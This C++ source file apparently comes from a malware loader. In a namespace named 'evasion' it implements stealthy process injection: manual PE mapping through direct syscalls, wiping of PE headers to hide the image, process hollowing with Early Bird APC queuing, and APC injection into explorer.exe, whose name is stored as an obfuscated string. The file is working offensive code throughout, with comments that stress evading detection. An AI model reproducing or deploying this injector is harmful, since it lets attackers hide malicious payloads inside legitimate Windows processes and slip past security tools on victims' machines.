#include "Injector.h"
#include "Syscalls.h"
#include "NtStructs.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../utils/ApiHasher.h"
#include <tlhelp32.h>
#include <algorithm>
#include <cwctype>

namespace evasion {

bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase) {
    PBYTE pSrcData = (PBYTE)payload.data();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);

    PVOID pTargetBase = NULL;
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

    // 1. Alloc RW via syscall
    NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return false;

    // 2. Map & Reloc locally
    std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
    PBYTE pLocalBase = localMapping.data();
    memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData == 0) continue;
        memcpy(pLocalBase + pSectionHeader[i].VirtualAddress, pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
    }

    DWORD_PTR delta = (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto& relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pLocalBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress != 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)(pReloc + 1);
                for (DWORD i = 0; i < count; i++) {
                    if ((pEntry[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        PDWORD_PTR pAddr = (PDWORD_PTR)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                        *pAddr += delta;
                    } else if ((pEntry[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                         PDWORD pAddr = (PDWORD)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                         *pAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 3. Write via syscall
    if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) return false;

    // 4. Wipe Headers for stealth
    std::vector<uint8_t> zeroHeader(pNtHeaders->OptionalHeader.SizeOfHeaders, 0);
    SysNtWriteVirtualMemory(hProcess, pTargetBase, zeroHeader.data(), zeroHeader.size(), NULL);

    // 5. Change protection to RX via syscall
    DWORD oldProt;
    PVOID pProtBase = pTargetBase;
    SIZE_T protSize = pNtHeaders->OptionalHeader.SizeOfImage;
    if (!NT_SUCCESS(SysNtProtectVirtualMemory(hProcess, &pProtBase, &protSize, PAGE_EXECUTE_READ, &oldProt))) return false;

    if (ppRemoteBase) *ppRemoteBase = pTargetBase;
    return true;
}

bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload) {
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);

    if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return false;

    PVOID pRemoteBase = NULL;
    if (!MapAndInject(pi.hProcess, payload, &pRemoteBase)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return false;
    }

    PBYTE pSrcData = (PBYTE)payload.data();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
    PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    // 6. Early Bird APC Injection via syscall
    // This is much stealthier than CreateRemoteThread
    NTSTATUS status = SysNtQueueApcThreadEx(pi.hThread, NULL, pEntryPoint, NULL, NULL, NULL);

    if (NT_SUCCESS(status)) {
        LOG_INFO("HollowProcess: Early Bird APC queued.");
        SysNtResumeThread(pi.hThread, NULL);
    } else {
        LOG_ERR("HollowProcess: NtQueueApcThreadEx fail. Status: " + utils::Shared::ToHex(status));
        TerminateProcess(pi.hProcess, 0);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return NT_SUCCESS(status);
}

DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring currentProcess = pe.szExeFile;
                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
                std::wstring targetProcess = processName;
                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
                if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
    (void)dropperPath;
    std::wstring explorer = utils::DecryptW(L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F");
    DWORD pid = GetProcessIdByName(explorer);
    if (pid == 0) return false;

    // We prefer HollowProcess for stealth in 2026, but if we must inject into existing:
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    PVOID pRemoteBase = NULL;
    bool success = MapAndInject(hProcess, payload, &pRemoteBase);

    if (success) {
        PBYTE pSrcData = (PBYTE)payload.data();
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
        PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

        // Try APC on a random thread in explorer
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            THREADENTRY32 te; te.dwSize = sizeof(te);
            if (Thread32First(hSnap, &te)) {
                do {
                    if (te.th32OwnerProcessID == pid) {
                        HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                        if (hT) {
                            if (NT_SUCCESS(SysNtQueueApcThreadEx(hT, NULL, pEntryPoint, NULL, NULL, NULL))) {
                                LOG_INFO("InjectIntoExplorer: APC queued to " + std::to_string(te.th32ThreadID));
                                CloseHandle(hT); break;
                            }
                            CloseHandle(hT);
                        }
                    }
                } while (Thread32Next(hSnap, &te));
            }
            CloseHandle(hSnap);
        }
    }
    CloseHandle(hProcess);
    return success;
}

} // namespace evasion
